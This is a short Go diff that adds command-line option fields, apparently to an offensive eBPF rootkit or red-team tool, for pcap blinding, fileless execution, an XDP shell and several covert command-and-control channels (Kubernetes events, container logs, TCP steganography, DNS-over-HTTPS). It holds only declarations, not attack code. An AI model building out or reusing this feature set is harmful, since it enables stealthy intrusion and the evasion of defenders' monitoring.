@@ -122,6 +122,37 @@ type CLIOptions struct {
 	// pcap blinding options
 	PcapHidePorts string
 	PcapHideIPs   string
+	// core dump suppression options
+	CoredumpPIDs string
+	// timeskew options
+	TimeskewPIDs   string
+	TimeskewOffset string
+	TimeskewMode   string
+	// BPF polymorphism options
+	PolymorphSeed string
+	// fileless execution options
+	FilelessPayload  string
+	FilelessFakeName string
+	// XDP shell options
+	XDPShellConnect  string
+	XDPShellProtocol string
+	// BPF IPC options
+	BPFIPCAction  string
+	BPFIPCChannel string
+	BPFIPCMessage string
+	// K8s event C2 options
+	K8sC2Namespace string
+	K8sC2Beacon    string
+	// container log C2 options
+	LogC2Container string
+	LogC2Encoding  string
+	// TCP steganography options
+	TCPStegoData    string
+	TCPStegoDest    string
+	TCPStegoBPP     string
+	// DoH C2 options
+	DoHC2Resolver string
+	DoHC2Domain   string
 }
 
 // LogLevelSanitizer is a log level sanitizer that ensures that the provided log level exists
